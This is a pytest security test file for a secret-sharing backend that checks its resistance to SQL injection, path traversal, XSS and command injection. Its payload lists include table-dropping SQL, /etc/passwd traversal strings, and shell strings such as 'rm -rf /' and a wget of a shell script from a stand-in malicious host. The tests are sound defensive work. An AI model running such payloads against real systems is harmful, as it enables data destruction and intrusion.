# backend/tests/test_security.py
import pytest
import json
import uuid
from unittest.mock import patch

from backend.app.storage import (
    store_encrypted_secret,
    retrieve_and_delete_secret,
    check_secret_exists,
    cleanup_expired_secrets
)
from backend.app.models import Secret
from backend.app import db


class TestSQLInjectionResistance:
    """Test cases to verify the application is resistant to SQL injection attacks."""
    
    def test_link_id_sql_injection_classic(self, client, app_context):
        """Test classic SQL injection attempts in link_id parameter."""
        sql_injection_payloads = [
            "'; DROP TABLE secrets; --",
            "' OR '1'='1",
            "' OR 1=1 --",
            "'; DELETE FROM secrets WHERE 1=1; --",
            "' UNION SELECT * FROM secrets --",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--",
            "' OR 'x'='x",
            "'; EXEC xp_cmdshell('dir'); --",
            "1'; WAITFOR DELAY '00:00:05'; --"
        ]
        
        for payload in sql_injection_payloads:
            # Test storage functions directly
            result = retrieve_and_delete_secret(payload)
            assert result is None, f"SQL injection payload '{payload}' should return None"
            
            exists = check_secret_exists(payload)
            assert exists is False, f"SQL injection payload '{payload}' should return False for existence check"
    
    def test_link_id_sql_injection_via_api(self, client):
        """Test SQL injection attempts via API endpoints."""
        sql_injection_payloads = [
            "'; DROP TABLE secrets; --",
            "' OR '1'='1",
            "' UNION SELECT encrypted_secret FROM secrets --",
            "'; DELETE FROM secrets; --",
            "' OR 1=1 --",
            "admin'--"
        ]
        
        for payload in sql_injection_payloads:
            # Test GET endpoint
            response = client.get(f'/api/share/secret/{payload}')
            # Should return 404 (not found) not 500 (error)
            assert response.status_code == 404, f"SQL injection in GET should return 404, not error for payload: '{payload}'"
            
            # Test HEAD endpoint  
            response = client.head(f'/api/share/secret/{payload}')
            assert response.status_code == 404, f"SQL injection in HEAD should return 404, not error for payload: '{payload}'"
    
    def test_secret_content_sql_injection(self, client):
        """Test SQL injection attempts in secret content."""
        sql_injection_payloads = [
            "'; DROP TABLE secrets; --",
            "' OR '1'='1",
            "'; DELETE FROM secrets WHERE 1=1; --",
            "' UNION SELECT password FROM users --",
            "'; INSERT INTO secrets (link_id, encrypted_secret) VALUES ('hack', 'payload'); --",
            "';EXEC xp_cmdshell('echo hacked');--",
            "'; WAITFOR DELAY '00:00:05'; --"
        ]
        
        stored_secrets = []
        
        # Store secrets with SQL injection payloads
        for payload in sql_injection_payloads:
            secret_data = {"secret": payload}
            response = client.post('/api/share',
                                  data=json.dumps(secret_data),
                                  content_type='application/json')
            
            # Should successfully store the malicious content
            assert response.status_code == 201, f"Should successfully store SQL injection payload: '{payload}'"
            
            data = json.loads(response.data)
            link_id = data['link_id']
            stored_secrets.append((link_id, payload))
        
        # Verify we can retrieve the exact payloads back
        for link_id, original_payload in stored_secrets:
            response = client.get(f'/api/share/secret/{link_id}')
            assert response.status_code == 200, f"Should retrieve stored SQL injection payload"
            
            data = json.loads(response.data)
            assert data['secret'] == original_payload, f"Retrieved content should match original SQL injection payload"
    
    def test_boolean_based_sql_injection(self, client, app_context):
        """Test boolean-based blind SQL injection attempts."""
        boolean_payloads = [
            "' AND 1=1 --",
            "' AND 1=2 --", 
            "' AND (SELECT COUNT(*) FROM secrets) > 0 --",
            "' AND (SELECT COUNT(*) FROM secrets) < 999999 --",
            "' AND ASCII(SUBSTRING((SELECT TOP 1 link_id FROM secrets),1,1)) > 65 --"
        ]
        
        for payload in boolean_payloads:
            # These should all return None/False, not leak information
            result = retrieve_and_delete_secret(payload)
            assert result is None, f"Boolean SQL injection should not leak data: '{payload}'"
            
            exists = check_secret_exists(payload)
            assert exists is False, f"Boolean SQL injection should not confirm existence: '{payload}'"
    
    def test_time_based_sql_injection(self, client, app_context):
        """Test time-based blind SQL injection attempts."""
        time_based_payloads = [
            "'; WAITFOR DELAY '00:00:05'; --",
            "'; SELECT pg_sleep(5); --",
            "' AND (SELECT COUNT(*) FROM generate_series(1,1000000)) > 0 --",
            "' OR SLEEP(5) --",
            "'; BENCHMARK(5000000,MD5(1)); --"
        ]
        
        import time
        
        for payload in time_based_payloads:
            start_time = time.time()
            
            # Test that operations complete quickly (not delayed by SQL injection)
            result = retrieve_and_delete_secret(payload)
            end_time = time.time()
            
            assert result is None, f"Time-based SQL injection should return None: '{payload}'"
            # Should complete in under 1 second (not be delayed by injection)
            assert (end_time - start_time) < 1.0, f"Time-based SQL injection should not cause delays: '{payload}'"
    
    def test_union_based_sql_injection(self, client, app_context):
        """Test UNION-based SQL injection attempts."""
        union_payloads = [
            "' UNION SELECT link_id FROM secrets --",
            "' UNION SELECT encrypted_secret FROM secrets --", 
            "' UNION SELECT created_at FROM secrets --",
            "' UNION SELECT NULL,NULL,NULL --",
            "' UNION ALL SELECT link_id, encrypted_secret FROM secrets --",
            "' UNION SELECT 1,2,3,4 --"
        ]
        
        for payload in union_payloads:
            result = retrieve_and_delete_secret(payload)
            assert result is None, f"UNION SQL injection should not return data: '{payload}'"
            
            exists = check_secret_exists(payload)
            assert exists is False, f"UNION SQL injection should not confirm existence: '{payload}'"
    
    def test_stacked_queries_sql_injection(self, client, app_context):
        """Test stacked queries SQL injection attempts."""
        stacked_payloads = [
            "'; CREATE TABLE test_hack (id INT); --",
            "'; INSERT INTO secrets VALUES ('hack', 'data', NOW()); --",
            "'; UPDATE secrets SET encrypted_secret = 'hacked'; --",
            "'; DELETE FROM secrets; --",
            "'; ALTER TABLE secrets ADD COLUMN hacked VARCHAR(255); --"
        ]
        
        # Count secrets before injection attempts
        initial_count = Secret.query.count()
        
        for payload in stacked_payloads:
            result = retrieve_and_delete_secret(payload)
            assert result is None, f"Stacked queries should not execute: '{payload}'"
        
        # Verify no secrets were affected by injection attempts
        final_count = Secret.query.count()
        assert final_count == initial_count, "Stacked queries should not modify the database"
    
    def test_second_order_sql_injection(self, client, app_context):
        """Test second-order SQL injection where payload is stored then retrieved."""
        # Store a secret with SQL injection payload
        malicious_secret = "'; DROP TABLE secrets; --"
        encrypted_data = b"fake_encrypted_data"
        
        # Store directly via storage function
        link_id = store_encrypted_secret(encrypted_data)
        assert link_id is not None, "Should successfully store secret"
        
        # Now try to use that link_id in another operation
        # This tests if the stored link_id could be used maliciously
        result = retrieve_and_delete_secret(link_id)
        assert result == encrypted_data, "Should retrieve original data safely"
        
        # Verify secret is properly deleted after retrieval
        result2 = retrieve_and_delete_secret(link_id)
        assert result2 is None, "Secret should be deleted after first retrieval"


class TestInputValidationSecurity:
    """Test cases for input validation security measures."""
    
    def test_malformed_uuid_handling(self, client):
        """Test handling of malformed UUID inputs."""
        malformed_uuids = [
            "not-a-uuid",
            "12345678-1234-1234-1234-12345678901",  # too short
            "12345678-1234-1234-1234-1234567890123",  # too long
            "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
            "12345678-1234-1234-1234-123456789012G",  # invalid character
            "",
            " ",
            "\n",
            "\t",
            "null",
            "undefined"
        ]
        
        for malformed_uuid in malformed_uuids:
            response = client.get(f'/api/share/secret/{malformed_uuid}')
            assert response.status_code == 404, f"Malformed UUID should return 404: '{malformed_uuid}'"
            
            response = client.head(f'/api/share/secret/{malformed_uuid}')
            assert response.status_code == 404, f"Malformed UUID should return 404: '{malformed_uuid}'"
    
    def test_path_traversal_attempts(self, client):
        """Test path traversal attack attempts."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "....//....//....//",
            "..%2F..%2F..%2F",
            "%252e%252e%252f",
            "..%c0%af..%c0%af..%c0%af",
            "/%2e%2e/%2e%2e/%2e%2e/",
            "..\\..\\..\\"
        ]
        
        for payload in path_traversal_payloads:
            response = client.get(f'/api/share/secret/{payload}')
            assert response.status_code == 404, f"Path traversal should return 404: '{payload}'"
    
    def test_xss_in_secret_content(self, client):
        """Test XSS payload handling in secret content."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>"
        ]
        
        stored_secrets = []
        
        for payload in xss_payloads:
            # Store XSS payload as secret content
            secret_data = {"secret": payload}
            response = client.post('/api/share',
                                  data=json.dumps(secret_data),
                                  content_type='application/json')
            
            assert response.status_code == 201, f"Should store XSS payload: '{payload}'"
            
            data = json.loads(response.data)
            stored_secrets.append((data['link_id'], payload))
        
        # Verify XSS payloads are stored and returned exactly as provided
        for link_id, original_payload in stored_secrets:
            response = client.get(f'/api/share/secret/{link_id}')
            assert response.status_code == 200, "Should retrieve XSS payload"
            
            data = json.loads(response.data)
            assert data['secret'] == original_payload, "XSS payload should be returned exactly as stored"
    
    def test_command_injection_in_secret_content(self, client):
        """Test command injection payload handling in secret content."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(ls -la)",
            "&& rm -rf /",
            "; rm -rf / --no-preserve-root",
            "| nc -l 4444",
            "; wget http://malicious.com/shell.sh",
            "`curl malicious.com`",
            "$(python -c 'import os; os.system(\"ls\")')"
        ]
        
        for payload in command_injection_payloads:
            # These should be treated as regular string content
            secret_data = {"secret": payload}
            response = client.post('/api/share',
                                  data=json.dumps(secret_data),
                                  content_type='application/json')
            
            assert response.status_code == 201, f"Should store command injection payload: '{payload}'"
            
            data = json.loads(response.data)
            link_id = data['link_id']
            
            # Retrieve and verify exact content
            response = client.get(f'/api/share/secret/{link_id}')
            assert response.status_code == 200, "Should retrieve command injection payload"
            
            data = json.loads(response.data)
            assert data['secret'] == payload, "Command injection payload should be stored as-is"


class TestDatabaseSecurity:
    """Test database-level security measures."""
    
    def test_sql_injection_with_special_characters(self, client, app_context):
        """Test SQL injection with various special characters."""
        special_char_payloads = [
            "'; --",
            "' /*",
            "' */",
            "';/**/--",
            "'%20OR%20'1'='1",
            "';%00",
            "'||'",
            "'&&'",
            "'\x00'",
            "'\x1a'",
            "'\\"
        ]
        
        for payload in special_char_payloads:
            result = retrieve_and_delete_secret(payload)
            assert result is None, f"Special character SQL injection should return None: '{payload}'"
            
            exists = check_secret_exists(payload)
            assert exists is False, f"Special character SQL injection should return False: '{payload}'"
    
    def test_sql_injection_parameter_pollution(self, client):
        """Test parameter pollution attempts in API calls."""
        # Test parameter pollution attempts that should all return 404
        pollution_attempts = [
            "fake-uuid&malicious='; DROP TABLE secrets; --",
            "fake-uuid?param='; DELETE FROM secrets; --", 
            "fake-uuid#'; INSERT INTO secrets VALUES('hack','data'); --",
            "fake-uuid%00'; UNION SELECT * FROM secrets; --"
        ]
        
        for polluted_param in pollution_attempts:
            response = client.get(f'/api/share/secret/{polluted_param}')
            # Should return 404 (not found) as the polluted parameter won't match any real secret
            assert response.status_code == 404, f"Parameter pollution should return 404: '{polluted_param}'"
    
    def test_concurrent_sql_injection_attempts(self, client, app_context):
        """Test multiple concurrent SQL injection attempts."""
        # Simple sequential test to verify multiple SQL injection attempts are handled safely
        injection_payloads = [
            "'; DROP TABLE secrets; --",
            "' OR 1=1 --",
            "'; DELETE FROM secrets; --",
            "' UNION SELECT * FROM secrets --",
            "'; INSERT INTO secrets VALUES('hack','data',NOW()); --"
        ]
        
        # Count secrets before injection attempts
        initial_count = Secret.query.count()
        
        # Test each payload sequentially 
        for payload in injection_payloads:
            result = retrieve_and_delete_secret(payload)
            assert result is None, f"SQL injection should return None: '{payload}'"
            
            exists = check_secret_exists(payload)
            assert exists is False, f"SQL injection should return False: '{payload}'"
        
        # Verify no secrets were affected by injection attempts
        final_count = Secret.query.count()
        assert final_count == initial_count, "SQL injection attempts should not modify the database"